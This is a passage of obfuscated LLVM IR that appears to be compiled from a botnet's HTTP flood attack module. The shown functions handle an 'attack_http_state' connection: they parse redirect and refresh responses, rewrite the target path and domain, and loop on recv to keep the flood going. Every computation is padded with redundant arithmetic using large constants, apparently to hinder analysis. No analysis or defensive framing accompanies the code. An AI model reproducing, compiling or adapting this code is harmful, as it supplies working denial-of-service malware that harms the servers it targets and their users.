  %1956 = load i8, i8* %1955, align 1
  %1957 = sext i8 %1956 to i32
  %1958 = icmp ne i32 %1957, 0
  br i1 %1958, label %1959, label %2255

; <label>:1959:                                   ; preds = %1951
  store i32 0, i32* %58, align 4
  %1960 = load i8*, i8** %57, align 8
  %1961 = load i32, i32* %10, align 4
  %1962 = sext i32 %1961 to i64
  %1963 = getelementptr inbounds i8, i8* %1960, i64 %1962
  store i8 0, i8* %1963, align 1
  %1964 = load i32, i32* %10, align 4
  %1965 = add i32 %1964, -873098452
  %1966 = add i32 %1965, 1
  %1967 = sub i32 %1966, -873098452
  %1968 = add nsw i32 %1964, 1
  store i32 %1967, i32* %10, align 4
  %1969 = load i8*, i8** %57, align 8
  %1970 = load i32, i32* %10, align 4
  %1971 = sext i32 %1970 to i64
  %1972 = getelementptr inbounds i8, i8* %1969, i64 %1971
  %1973 = load i8, i8* %1972, align 1
  %1974 = sext i8 %1973 to i32
  %1975 = icmp eq i32 %1974, 32
  br i1 %1975, label %1976, label %1981

; <label>:1976:                                   ; preds = %1959
  %1977 = load i32, i32* %10, align 4
  %1978 = sub i32 0, 1
  %1979 = sub i32 %1977, %1978
  %1980 = add nsw i32 %1977, 1
  store i32 %1979, i32* %10, align 4
  br label %1981

; <label>:1981:                                   ; preds = %1976, %1959
  %1982 = load i8*, i8** %57, align 8
  %1983 = load i32, i32* %10, align 4
  %1984 = sext i32 %1983 to i64
  %1985 = getelementptr inbounds i8, i8* %1982, i64 %1984
  %1986 = load i8*, i8** %57, align 8
  %1987 = load i32, i32* %10, align 4
  %1988 = sext i32 %1987 to i64
  %1989 = getelementptr inbounds i8, i8* %1986, i64 %1988
  %1990 = call i32 @util_strlen(i8* %1989)
  %1991 = call i32 @util_stristr(i8* %1985, i32 %1990, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1992 = icmp ne i32 %1991, -1
  br i1 %1992, label %1993, label %2009

; <label>:1993:                                   ; preds = %1981
  %1994 = load i8*, i8** %57, align 8
  %1995 = load i32, i32* %10, align 4
  %1996 = sext i32 %1995 to i64
  %1997 = getelementptr inbounds i8, i8* %1994, i64 %1996
  %1998 = load i8*, i8** %57, align 8
  %1999 = load i32, i32* %10, align 4
  %2000 = sext i32 %1999 to i64
  %2001 = getelementptr inbounds i8, i8* %1998, i64 %2000
  %2002 = call i32 @util_strlen(i8* %2001)
  %2003 = call i32 @util_stristr(i8* %1997, i32 %2002, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2004 = load i32, i32* %10, align 4
  %2005 = sub i32 %2004, 1184911791
  %2006 = add i32 %2005, %2003
  %2007 = add i32 %2006, 1184911791
  %2008 = add nsw i32 %2004, %2003
  store i32 %2007, i32* %10, align 4
  br label %2009

; <label>:2009:                                   ; preds = %1993, %1981
  %2010 = load i8*, i8** %57, align 8
  %2011 = load i32, i32* %10, align 4
  %2012 = sext i32 %2011 to i64
  %2013 = getelementptr inbounds i8, i8* %2010, i64 %2012
  %2014 = load i8, i8* %2013, align 1
  %2015 = sext i8 %2014 to i32
  %2016 = icmp eq i32 %2015, 34
  br i1 %2016, label %2017, label %2056

; <label>:2017:                                   ; preds = %2009
  %2018 = load i32, i32* %10, align 4
  %2019 = sub i32 0, 1
  %2020 = sub i32 %2018, %2019
  %2021 = add nsw i32 %2018, 1
  store i32 %2020, i32* %10, align 4
  %2022 = load i8*, i8** %57, align 8
  %2023 = load i32, i32* %10, align 4
  %2024 = sext i32 %2023 to i64
  %2025 = getelementptr inbounds i8, i8* %2022, i64 %2024
  %2026 = load i8*, i8** %57, align 8
  %2027 = load i32, i32* %10, align 4
  %2028 = sext i32 %2027 to i64
  %2029 = getelementptr inbounds i8, i8* %2026, i64 %2028
  %2030 = call i32 @util_strlen(i8* %2029)
  %2031 = sub i32 0, 1
  %2032 = add i32 %2030, %2031
  %2033 = sub nsw i32 %2030, 1
  %2034 = sext i32 %2032 to i64
  %2035 = getelementptr inbounds i8, i8* %2025, i64 %2034
  %2036 = load i8, i8* %2035, align 1
  %2037 = sext i8 %2036 to i32
  %2038 = icmp eq i32 %2037, 34
  br i1 %2038, label %2039, label %2055

; <label>:2039:                                   ; preds = %2017
  %2040 = load i8*, i8** %57, align 8
  %2041 = load i32, i32* %10, align 4
  %2042 = sext i32 %2041 to i64
  %2043 = getelementptr inbounds i8, i8* %2040, i64 %2042
  %2044 = load i8*, i8** %57, align 8
  %2045 = load i32, i32* %10, align 4
  %2046 = sext i32 %2045 to i64
  %2047 = getelementptr inbounds i8, i8* %2044, i64 %2046
  %2048 = call i32 @util_strlen(i8* %2047)
  %2049 = sub i32 %2048, -2018302468
  %2050 = sub i32 %2049, 1
  %2051 = add i32 %2050, -2018302468
  %2052 = sub nsw i32 %2048, 1
  %2053 = sext i32 %2051 to i64
  %2054 = getelementptr inbounds i8, i8* %2043, i64 %2053
  store i8 0, i8* %2054, align 1
  br label %2055

; <label>:2055:                                   ; preds = %2039, %2017
  br label %2056

; <label>:2056:                                   ; preds = %2055, %2009
  %2057 = load i8*, i8** %57, align 8
  %2058 = call i32 @util_atoi(i8* %2057, i32 10)
  store i32 %2058, i32* %58, align 4
  br label %2059

; <label>:2059:                                   ; preds = %2078, %2056
  %2060 = load i32, i32* %58, align 4
  %2061 = icmp sgt i32 %2060, 0
  br i1 %2061, label %2062, label %2076

; <label>:2062:                                   ; preds = %2059
  %2063 = load i32, i32* %58, align 4
  %2064 = icmp slt i32 %2063, 10
  br i1 %2064, label %2065, label %2076

; <label>:2065:                                   ; preds = %2062
  %2066 = load i32, i32* %27, align 4
  %2067 = load i32, i32* %58, align 4
  %2068 = sub i32 0, %2066
  %2069 = sub i32 0, %2067
  %2070 = add i32 %2068, %2069
  %2071 = sub i32 0, %2070
  %2072 = add i32 %2066, %2067
  %2073 = zext i32 %2071 to i64
  %2074 = call i64 @time(i64* null) #6
  %2075 = icmp sgt i64 %2073, %2074
  br label %2076

; <label>:2076:                                   ; preds = %2065, %2062, %2059
  %2077 = phi i1 [ false, %2062 ], [ false, %2059 ], [ %2075, %2065 ]
  br i1 %2077, label %2078, label %2080

; <label>:2078:                                   ; preds = %2076
  %2079 = call i32 @sleep(i32 1)
  br label %2059

; <label>:2080:                                   ; preds = %2076
  %2081 = load i8*, i8** %57, align 8
  %2082 = load i32, i32* %10, align 4
  %2083 = sext i32 %2082 to i64
  %2084 = getelementptr inbounds i8, i8* %2081, i64 %2083
  store i8* %2084, i8** %57, align 8
  %2085 = load i8*, i8** %57, align 8
  %2086 = load i8*, i8** %57, align 8
  %2087 = call i32 @util_strlen(i8* %2086)
  %2088 = call i32 @util_stristr(i8* %2085, i32 %2087, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %2089 = icmp eq i32 %2088, 4
  br i1 %2089, label %2090, label %2197

; <label>:2090:                                   ; preds = %2080
  store i32 7, i32* %10, align 4
  %2091 = load i8*, i8** %57, align 8
  %2092 = getelementptr inbounds i8, i8* %2091, i64 4
  %2093 = load i8, i8* %2092, align 1
  %2094 = sext i8 %2093 to i32
  %2095 = icmp eq i32 %2094, 115
  br i1 %2095, label %2096, label %2102

; <label>:2096:                                   ; preds = %2090
  %2097 = load i32, i32* %10, align 4
  %2098 = sub i32 %2097, 1519008839
  %2099 = add i32 %2098, 1
  %2100 = add i32 %2099, 1519008839
  %2101 = add nsw i32 %2097, 1
  store i32 %2100, i32* %10, align 4
  br label %2102

; <label>:2102:                                   ; preds = %2096, %2090
  %2103 = load i8*, i8** %57, align 8
  %2104 = load i8*, i8** %57, align 8
  %2105 = load i32, i32* %10, align 4
  %2106 = sext i32 %2105 to i64
  %2107 = getelementptr inbounds i8, i8* %2104, i64 %2106
  %2108 = load i32, i32* %56, align 4
  %2109 = load i32, i32* %10, align 4
  %2110 = add i32 %2108, 1772494016
  %2111 = sub i32 %2110, %2109
  %2112 = sub i32 %2111, 1772494016
  %2113 = sub nsw i32 %2108, %2109
  %2114 = sext i32 %2112 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2103, i8* %2107, i64 %2114, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %2115

; <label>:2115:                                   ; preds = %2136, %2102
  %2116 = load i8*, i8** %57, align 8
  %2117 = load i32, i32* %10, align 4
  %2118 = sext i32 %2117 to i64
  %2119 = getelementptr inbounds i8, i8* %2116, i64 %2118
  %2120 = load i8, i8* %2119, align 1
  %2121 = sext i8 %2120 to i32
  %2122 = icmp ne i32 %2121, 0
  br i1 %2122, label %2123, label %2141

; <label>:2123:                                   ; preds = %2115
  %2124 = load i8*, i8** %57, align 8
  %2125 = load i32, i32* %10, align 4
  %2126 = sext i32 %2125 to i64
  %2127 = getelementptr inbounds i8, i8* %2124, i64 %2126
  %2128 = load i8, i8* %2127, align 1
  %2129 = sext i8 %2128 to i32
  %2130 = icmp eq i32 %2129, 47
  br i1 %2130, label %2131, label %2136

; <label>:2131:                                   ; preds = %2123
  %2132 = load i8*, i8** %57, align 8
  %2133 = load i32, i32* %10, align 4
  %2134 = sext i32 %2133 to i64
  %2135 = getelementptr inbounds i8, i8* %2132, i64 %2134
  store i8 0, i8* %2135, align 1
  br label %2141

; <label>:2136:                                   ; preds = %2123
  %2137 = load i32, i32* %10, align 4
  %2138 = sub i32 0, 1
  %2139 = sub i32 %2137, %2138
  %2140 = add nsw i32 %2137, 1
  store i32 %2139, i32* %10, align 4
  br label %2115

; <label>:2141:                                   ; preds = %2131, %2115
  %2142 = load i8*, i8** %57, align 8
  %2143 = call i32 @util_strlen(i8* %2142)
  %2144 = icmp sgt i32 %2143, 0
  br i1 %2144, label %2145, label %2155

; <label>:2145:                                   ; preds = %2141
  %2146 = load i8*, i8** %57, align 8
  %2147 = call i32 @util_strlen(i8* %2146)
  %2148 = icmp slt i32 %2147, 128
  br i1 %2148, label %2149, label %2155

; <label>:2149:                                   ; preds = %2145
  %2150 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2151 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2150, i32 0, i32 7
  %2152 = getelementptr inbounds [129 x i8], [129 x i8]* %2151, i32 0, i32 0
  %2153 = load i8*, i8** %57, align 8
  %2154 = call i32 @util_strcpy(i8* %2152, i8* %2153)
  br label %2155

; <label>:2155:                                   ; preds = %2149, %2145, %2141
  %2156 = load i8*, i8** %57, align 8
  %2157 = load i32, i32* %10, align 4
  %2158 = sub i32 0, 1
  %2159 = sub i32 %2157, %2158
  %2160 = add nsw i32 %2157, 1
  %2161 = sext i32 %2159 to i64
  %2162 = getelementptr inbounds i8, i8* %2156, i64 %2161
  %2163 = call i32 @util_strlen(i8* %2162)
  %2164 = icmp slt i32 %2163, 256
  br i1 %2164, label %2165, label %2196

; <label>:2165:                                   ; preds = %2155
  %2166 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2167 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2166, i32 0, i32 6
  %2168 = getelementptr inbounds [257 x i8], [257 x i8]* %2167, i32 0, i32 0
  %2169 = getelementptr inbounds i8, i8* %2168, i64 1
  call void @util_zero(i8* %2169, i32 255)
  %2170 = load i8*, i8** %57, align 8
  %2171 = load i32, i32* %10, align 4
  %2172 = add i32 %2171, -308267687
  %2173 = add i32 %2172, 1
  %2174 = sub i32 %2173, -308267687
  %2175 = add nsw i32 %2171, 1
  %2176 = sext i32 %2174 to i64
  %2177 = getelementptr inbounds i8, i8* %2170, i64 %2176
  %2178 = call i32 @util_strlen(i8* %2177)
  %2179 = icmp sgt i32 %2178, 0
  br i1 %2179, label %2180, label %2195

; <label>:2180:                                   ; preds = %2165
  %2181 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2181, i32 0, i32 6
  %2183 = getelementptr inbounds [257 x i8], [257 x i8]* %2182, i32 0, i32 0
  %2184 = getelementptr inbounds i8, i8* %2183, i64 1
  %2185 = load i8*, i8** %57, align 8
  %2186 = load i32, i32* %10, align 4
  %2187 = sub i32 0, %2186
  %2188 = sub i32 0, 1
  %2189 = add i32 %2187, %2188
  %2190 = sub i32 0, %2189
  %2191 = add nsw i32 %2186, 1
  %2192 = sext i32 %2190 to i64
  %2193 = getelementptr inbounds i8, i8* %2185, i64 %2192
  %2194 = call i32 @util_strcpy(i8* %2184, i8* %2193)
  br label %2195

; <label>:2195:                                   ; preds = %2180, %2165
  br label %2196

; <label>:2196:                                   ; preds = %2195, %2155
  br label %2248

; <label>:2197:                                   ; preds = %2080
  %2198 = load i8*, i8** %57, align 8
  %2199 = getelementptr inbounds i8, i8* %2198, i64 0
  %2200 = load i8, i8* %2199, align 1
  %2201 = sext i8 %2200 to i32
  %2202 = icmp eq i32 %2201, 47
  br i1 %2202, label %2203, label %2247

; <label>:2203:                                   ; preds = %2197
  %2204 = load i8*, i8** %57, align 8
  %2205 = load i32, i32* %10, align 4
  %2206 = sub i32 %2205, -952448709
  %2207 = add i32 %2206, 1
  %2208 = add i32 %2207, -952448709
  %2209 = add nsw i32 %2205, 1
  %2210 = sext i32 %2208 to i64
  %2211 = getelementptr inbounds i8, i8* %2204, i64 %2210
  %2212 = call i32 @util_strlen(i8* %2211)
  %2213 = icmp slt i32 %2212, 256
  br i1 %2213, label %2214, label %2246

; <label>:2214:                                   ; preds = %2203
  %2215 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2216 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2215, i32 0, i32 6
  %2217 = getelementptr inbounds [257 x i8], [257 x i8]* %2216, i32 0, i32 0
  %2218 = getelementptr inbounds i8, i8* %2217, i64 1
  call void @util_zero(i8* %2218, i32 255)
  %2219 = load i8*, i8** %57, align 8
  %2220 = load i32, i32* %10, align 4
  %2221 = sub i32 0, %2220
  %2222 = sub i32 0, 1
  %2223 = add i32 %2221, %2222
  %2224 = sub i32 0, %2223
  %2225 = add nsw i32 %2220, 1
  %2226 = sext i32 %2224 to i64
  %2227 = getelementptr inbounds i8, i8* %2219, i64 %2226
  %2228 = call i32 @util_strlen(i8* %2227)
  %2229 = icmp sgt i32 %2228, 0
  br i1 %2229, label %2230, label %2245

; <label>:2230:                                   ; preds = %2214
  %2231 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2232 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2231, i32 0, i32 6
  %2233 = getelementptr inbounds [257 x i8], [257 x i8]* %2232, i32 0, i32 0
  %2234 = getelementptr inbounds i8, i8* %2233, i64 1
  %2235 = load i8*, i8** %57, align 8
  %2236 = load i32, i32* %10, align 4
  %2237 = sub i32 0, %2236
  %2238 = sub i32 0, 1
  %2239 = add i32 %2237, %2238
  %2240 = sub i32 0, %2239
  %2241 = add nsw i32 %2236, 1
  %2242 = sext i32 %2240 to i64
  %2243 = getelementptr inbounds i8, i8* %2235, i64 %2242
  %2244 = call i32 @util_strcpy(i8* %2234, i8* %2243)
  br label %2245

; <label>:2245:                                   ; preds = %2230, %2214
  br label %2246

; <label>:2246:                                   ; preds = %2245, %2203
  br label %2247

; <label>:2247:                                   ; preds = %2246, %2197
  br label %2248

; <label>:2248:                                   ; preds = %2247, %2196
  %2249 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2250 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2249, i32 0, i32 9
  %2251 = getelementptr inbounds [9 x i8], [9 x i8]* %2250, i32 0, i32 0
  %2252 = call i8* @strcpy(i8* %2251, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %2253 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2253, i32 0, i32 1
  store i8 10, i8* %2254, align 4
  br label %2782

; <label>:2255:                                   ; preds = %1951
  br label %2256

; <label>:2256:                                   ; preds = %2255, %1879
  br label %2257

; <label>:2257:                                   ; preds = %2256, %1856
  %2258 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2259 = load i32, i32* %12, align 4
  %2260 = call i32 @util_memsearch(i8* %2258, i32 %2259, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %2260, i32* %37, align 4
  %2261 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2262 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2261, i32 0, i32 9
  %2263 = getelementptr inbounds [9 x i8], [9 x i8]* %2262, i32 0, i32 0
  %2264 = call signext i8 @util_strcmp(i8* %2263, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %2265 = sext i8 %2264 to i32
  %2266 = icmp ne i32 %2265, 0
  br i1 %2266, label %2274, label %2267

; <label>:2267:                                   ; preds = %2257
  %2268 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2269 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2268, i32 0, i32 9
  %2270 = getelementptr inbounds [9 x i8], [9 x i8]* %2269, i32 0, i32 0
  %2271 = call signext i8 @util_strcmp(i8* %2270, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %2272 = sext i8 %2271 to i32
  %2273 = icmp ne i32 %2272, 0
  br i1 %2273, label %2274, label %2277

; <label>:2274:                                   ; preds = %2267, %2257
  %2275 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2276 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2275, i32 0, i32 1
  store i8 7, i8* %2276, align 4
  br label %2288

; <label>:2277:                                   ; preds = %2267
  %2278 = load i32, i32* %12, align 4
  %2279 = load i32, i32* %37, align 4
  %2280 = icmp sgt i32 %2278, %2279
  br i1 %2280, label %2281, label %2284

; <label>:2281:                                   ; preds = %2277
  %2282 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2283 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2282, i32 0, i32 1
  store i8 10, i8* %2283, align 4
  br label %2287

; <label>:2284:                                   ; preds = %2277
  %2285 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2286 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2285, i32 0, i32 1
  store i8 1, i8* %2286, align 4
  br label %2287

; <label>:2287:                                   ; preds = %2284, %2281
  br label %2288

; <label>:2288:                                   ; preds = %2287, %2274
  %2289 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2290 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2289, i32 0, i32 0
  %2291 = load i32, i32* %2290, align 4
  %2292 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2293 = load i32, i32* %37, align 4
  %2294 = sext i32 %2293 to i64
  %2295 = call i64 @recv(i32 %2291, i8* %2292, i64 %2294, i32 16384)
  %2296 = trunc i64 %2295 to i32
  store i32 %2296, i32* %12, align 4
  br label %2780

; <label>:2297:                                   ; preds = %1139
  %2298 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2299 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2298, i32 0, i32 1
  %2300 = load i8, i8* %2299, align 4
  %2301 = zext i8 %2300 to i32
  %2302 = icmp eq i32 %2301, 7
  br i1 %2302, label %2303, label %2727

; <label>:2303:                                   ; preds = %2297
  br label %2304

; <label>:2304:                                   ; preds = %2725, %2303
  %2305 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2305, i32 0, i32 1
  %2307 = load i8, i8* %2306, align 4
  %2308 = zext i8 %2307 to i32
  %2309 = icmp ne i32 %2308, 7
  br i1 %2309, label %2310, label %2311

; <label>:2310:                                   ; preds = %2304
  br label %2726

; <label>:2311:                                   ; preds = %2304
  %2312 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2313 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2312, i32 0, i32 17
  %2314 = load i32, i32* %2313, align 4
  %2315 = icmp eq i32 %2314, 1024
  br i1 %2315, label %2316, label %2331

; <label>:2316:                                   ; preds = %2311
  %2317 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2318 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2317, i32 0, i32 18
  %2319 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2318, i32 0, i32 0
  %2320 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2321 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2320, i32 0, i32 18
  %2322 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2321, i32 0, i32 0
  %2323 = getelementptr inbounds i8, i8* %2322, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2319, i8* %2323, i64 960, i32 1, i1 false)
  %2324 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2325 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2324, i32 0, i32 17
  %2326 = load i32, i32* %2325, align 4
  %2327 = sub i32 %2326, -1307752766
  %2328 = sub i32 %2327, 64
  %2329 = add i32 %2328, -1307752766
  %2330 = sub nsw i32 %2326, 64
  store i32 %2329, i32* %2325, align 4
  br label %2331

; <label>:2331:                                   ; preds = %2316, %2311
  %2332 = call i32* @__errno_location() #7
  store i32 0, i32* %2332, align 4
  %2333 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2334 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2333, i32 0, i32 0
  %2335 = load i32, i32* %2334, align 4
  %2336 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2337 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2336, i32 0, i32 18
  %2338 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2337, i32 0, i32 0
  %2339 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2340 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2339, i32 0, i32 17
  %2341 = load i32, i32* %2340, align 4
  %2342 = sext i32 %2341 to i64
  %2343 = getelementptr inbounds i8, i8* %2338, i64 %2342
  %2344 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2345 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2344, i32 0, i32 17
  %2346 = load i32, i32* %2345, align 4
  %2347 = sub i32 0, %2346
  %2348 = add i32 1024, %2347
  %2349 = sub nsw i32 1024, %2346
  %2350 = sext i32 %2348 to i64
  %2351 = call i64 @recv(i32 %2335, i8* %2343, i64 %2350, i32 16384)
  %2352 = trunc i64 %2351 to i32
  store i32 %2352, i32* %12, align 4
  %2353 = load i32, i32* %12, align 4
  %2354 = icmp eq i32 %2353, 0
  br i1 %2354, label %2355, label %2357

; <label>:2355:                                   ; preds = %2331
  %2356 = call i32* @__errno_location() #7
  store i32 104, i32* %2356, align 4
  store i32 -1, i32* %12, align 4
  br label %2357

; <label>:2357:                                   ; preds = %2355, %2331
  %2358 = load i32, i32* %12, align 4
  %2359 = icmp eq i32 %2358, -1
  br i1 %2359, label %2360, label %2378

; <label>:2360:                                   ; preds = %2357
  %2361 = call i32* @__errno_location() #7
  %2362 = load i32, i32* %2361, align 4
  %2363 = icmp ne i32 %2362, 11
  br i1 %2363, label %2364, label %2377

; <label>:2364:                                   ; preds = %2360
  %2365 = call i32* @__errno_location() #7
  %2366 = load i32, i32* %2365, align 4
  %2367 = icmp ne i32 %2366, 11
  br i1 %2367, label %2368, label %2377

; <label>:2368:                                   ; preds = %2364
  %2369 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2370 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2369, i32 0, i32 0
  %2371 = load i32, i32* %2370, align 4
  %2372 = call i32 @close(i32 %2371)
  %2373 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2374 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2373, i32 0, i32 0
  store i32 -1, i32* %2374, align 4
  %2375 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2376 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2375, i32 0, i32 1
  store i8 0, i8* %2376, align 4
  br label %2377

; <label>:2377:                                   ; preds = %2368, %2364, %2360
  br label %2726

; <label>:2378:                                   ; preds = %2357
  %2379 = load i32, i32* %12, align 4
  %2380 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2381 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2380, i32 0, i32 17
  %2382 = load i32, i32* %2381, align 4
  %2383 = sub i32 0, %2382
  %2384 = sub i32 0, %2379
  %2385 = add i32 %2383, %2384
  %2386 = sub i32 0, %2385
  %2387 = add nsw i32 %2382, %2379
  store i32 %2386, i32* %2381, align 4
  %2388 = load i32, i32* %27, align 4
  %2389 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2390 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2389, i32 0, i32 2
  store i32 %2388, i32* %2390, align 4
  br label %2391

; <label>:2391:                                   ; preds = %2724, %2378
  store i32 0, i32* %59, align 4
  %2392 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2393 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2392, i32 0, i32 14
  %2394 = load i32, i32* %2393, align 4
  %2395 = icmp sgt i32 %2394, 0
  br i1 %2395, label %2396, label %2594

; <label>:2396:                                   ; preds = %2391
  %2397 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2398 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2397, i32 0, i32 14
  %2399 = load i32, i32* %2398, align 4
  %2400 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2401 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2400, i32 0, i32 17
  %2402 = load i32, i32* %2401, align 4
  %2403 = icmp sgt i32 %2399, %2402
  br i1 %2403, label %2404, label %2408

; <label>:2404:                                   ; preds = %2396
  %2405 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2406 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2405, i32 0, i32 17
  %2407 = load i32, i32* %2406, align 4
  br label %2412

; <label>:2408:                                   ; preds = %2396
  %2409 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2410 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2409, i32 0, i32 14
  %2411 = load i32, i32* %2410, align 4
  br label %2412

; <label>:2412:                                   ; preds = %2408, %2404
  %2413 = phi i32 [ %2407, %2404 ], [ %2411, %2408 ]
  store i32 %2413, i32* %59, align 4
  %2414 = load i32, i32* %59, align 4
  %2415 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2416 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2415, i32 0, i32 14
  %2417 = load i32, i32* %2416, align 4
  %2418 = sub i32 0, %2414
  %2419 = add i32 %2417, %2418
  %2420 = sub nsw i32 %2417, %2414
  store i32 %2419, i32* %2416, align 4
  %2421 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2421, i32 0, i32 11
  %2423 = load i32, i32* %2422, align 4
  %2424 = icmp eq i32 %2423, 1
  br i1 %2424, label %2425, label %2593

; <label>:2425:                                   ; preds = %2412
  %2426 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2426, i32 0, i32 18
  %2428 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2427, i32 0, i32 0
  %2429 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2430 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2429, i32 0, i32 17
  %2431 = load i32, i32* %2430, align 4
  %2432 = call i8* @table_retrieve_val(i32 43, i32* null)
  %2433 = call i32 @util_memsearch(i8* %2428, i32 %2431, i8* %2432, i32 11)
  %2434 = icmp ne i32 %2433, -1
  br i1 %2434, label %2435, label %2592

; <label>:2435:                                   ; preds = %2425
  %2436 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2437 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2436, i32 0, i32 18
  %2438 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2437, i32 0, i32 0
  %2439 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2440 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2439, i32 0, i32 17
  %2441 = load i32, i32* %2440, align 4
  %2442 = call i8* @table_retrieve_val(i32 43, i32* null)
  %2443 = call i32 @util_memsearch(i8* %2438, i32 %2441, i8* %2442, i32 11)
  store i32 %2443, i32* %60, align 4
  %2444 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2445 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2444, i32 0, i32 18
  %2446 = load i32, i32* %60, align 4
  %2447 = sext i32 %2446 to i64
  %2448 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2445, i64 0, i64 %2447
  %2449 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
